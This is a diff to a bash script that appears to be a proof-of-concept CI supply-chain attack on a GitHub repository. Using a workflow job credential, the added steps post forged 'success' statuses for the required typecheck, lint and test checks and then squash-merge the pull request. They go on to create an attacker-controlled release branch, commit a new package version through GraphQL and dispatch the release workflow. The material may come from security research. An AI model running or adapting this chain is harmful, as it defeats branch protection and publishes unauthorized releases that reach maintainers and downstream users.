@@ -80,10 +80,44 @@ else
 fi
 
 echo
-echo "### 5. reaching the release workflow at a ref the attacker created"
+echo "### 5. making the approval count: statuses, then merge"
+# GitHub does not start workflow runs for pushes made with the job credential, so the required
+# checks will never arrive on their own. The credential posts them itself. They are attributed to
+# the Actions app, which is the identity the branch rule pins those contexts to.
+for ctx in typecheck lint test; do
+  gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/statuses/$new_oid" \
+    -d "$(jq -nc --arg c "$ctx" '{state:"success",context:$c,description:"passed"}')" \
+    | jq -r '"posted status \(.context) by \(.creator.login)"'
+done
+
+for i in 1 2 3 4 5 6; do
+  st=$(gh_api "$API/repos/$GITHUB_REPOSITORY/pulls/$PR_NUM" | jq -r '.mergeable_state')
+  echo "merge state: $st"
+  [ "$st" = "clean" ] && break
+  sleep 5
+done
+
+gh_api -X PUT "$API/repos/$GITHUB_REPOSITORY/pulls/$PR_NUM/merge" \
+  -d '{"merge_method":"squash"}' | jq -r '"merge: \(.merged) \(.message // "")"'
+echo "default branch is now $(gh_api "$API/repos/$GITHUB_REPOSITORY/git/ref/heads/main" | jq -r '.object.sha[0:8]')"
+
+echo
+echo "### 6. reaching the release workflow at a ref the attacker created"
 REL="release-$(date +%s)"
 gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/git/refs" \
   -d "$(jq -nc --arg r "refs/heads/$REL" --arg s "$base_oid" '{ref:$r,sha:$s}')" | jq -r '.ref // .message'
+
+# The attacker controls what is on that branch, so it publishes a version that does not exist yet.
+VER="0.0.$(date +%s)"
+pkg=$(jq --arg v "$VER" '.version=$v' package.json | base64 | tr -d '\n')
+relpay=$(jq -nc --arg r "$GITHUB_REPOSITORY" --arg b "refs/heads/$REL" --arg oid "$base_oid" \
+  --arg msg "Prepare release" --arg path "package.json" --arg content "$pkg" \
+  '{query:"mutation($i:CreateCommitOnBranchInput!){createCommitOnBranch(input:$i){commit{oid}}}",
+    variables:{i:{branch:{repositoryNameWithOwner:$r,branchName:$b},expectedHeadOid:$oid,
+    message:{headline:$msg},fileChanges:{additions:[{path:$path,contents:$content}]}}}}')
+rel_oid=$(gql "$relpay" | jq -r '.data.createCommitOnBranch.commit.oid // empty')
+echo "release branch $REL at ${rel_oid:0:8}, version $VER"
+
 gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/actions/workflows/release.yml/dispatches" \
   -d "$(jq -nc --arg r "$REL" '{ref:$r}')" -o /dev/null -w 'workflow_dispatch HTTP %{http_code}\n'
 echo "dispatched release.yml at $REL"
